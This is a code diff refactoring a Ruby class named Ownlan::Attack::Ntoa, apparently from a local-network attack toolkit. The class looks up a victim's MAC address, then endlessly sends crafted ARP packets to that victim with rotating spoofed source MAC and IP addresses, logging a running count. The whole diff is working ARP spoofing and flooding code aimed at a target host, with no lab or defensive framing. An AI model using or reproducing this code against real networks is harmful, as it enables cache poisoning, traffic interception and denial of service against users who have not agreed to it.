@@ -1,42 +1,62 @@
-module Attack
-  class Ntoa < Base
+module Ownlan
+  module Attack
+    class Ntoa < Base
 
-    def process
-      victim_mac = PacketFu::Utils::arp(config.victim_ip, iface: config.interface)
+      def process
+        victim_mac = ::PacketFu::Utils::arp(config.ntoa.strip, iface: config.interface.strip)
 
-      @a = 10
-      @b = 10
-      @c = 10
-      @i = 0
+        victim_ip  = config.ntoa
 
-      saddr = "00:03:FF:#{@a}:#{@b}:#{@c}"
-      daddr = victim_mac
-      saddr_ip = "10.188.#{@b}.#{@c}"
-      daddr_ip =  config.victim_ip
+        @a = 10
+        @b = 10
+        @c = 10
+        @i = 0
 
-      crafted_packet = ServiceObjects::CraftArpPacket.new(config, saddr, daddr, saddr_ip, daddr_ip)
+        saddr = "00:03:FF:#{@a}:#{@b}:#{@c}"
+        daddr = victim_mac
+        saddr_ip = "#{source_ip_base}.#{@b}.#{@c}"
+        daddr_ip = victim_ip
 
-      loop do
-        while @a < 100 do
-          @b = 10
-          @a += 1
-          while @b < 100 && @a < 100 do
-            @c = 10
-            @b += 1
-            while @c < 100 && @b < 100 do
-              @c += 1
-              crafted_packet.eth_saddr =  "00:03:FF:#{@a}:#{@b}:#{@c}"
-              crafted_packet.arp_saddr_mac = "#00:03:FF:#{@a}:#{@b}:#{@c}"
-              crafted_packet.arp_saddr_ip = "10.188.#{(@b - 10) }.#{(@c - 10)}"
-              crafted_packet.to_w(config.interface)
-              @i += 1
-              print "\r The ARP packet has been sent successfully #{@i} times"
-              sleep config.delay
+        crafted_packet = ServiceObjects::CraftArpPacket.new(config, saddr, daddr, saddr_ip, daddr_ip).call
+
+        loop do
+          while @a < 100 do
+            @b = 10
+            @a += 1
+            while @b < 100 && @a < 100 do
+              @c = 10
+              @b += 1
+              while @c < 100 && @b < 100 do
+                @c += 1
+
+                crafted_packet.eth_saddr     = source_mac(@a, @b, @c)     # another mac address does not work on linux? or local network is dropped?
+                crafted_packet.arp_saddr_mac = source_mac(@a, @b, @c)  # another mac address does not work on linux? or local network is dropped?
+
+                crafted_packet.arp_saddr_ip = "#{source_ip_base}.#{(@b - 10) }.#{(@c - 10)}"
+
+                crafted_packet.to_w(config.interface)
+                @i += 1
+                print "\r The ARP packet has been sent successfully #{@i} times"
+                sleep config.delay
+              end
             end
           end
         end
       end
-    end
 
+      private
+
+      def source_ip_base
+        ServiceObjects::NetworkInformation.self_ip.split('.')[0..1].join('.')
+      end
+
+      def source_mac(a=nil, b=nil, c=nil)
+        if config.random_mac
+          "00:03:FF:#{@a}:#{@b}:#{@c}"
+        else
+          ServiceObjects::NetworkInformation.self_mac(config.interface)
+        end
+      end
+    end
   end
 end
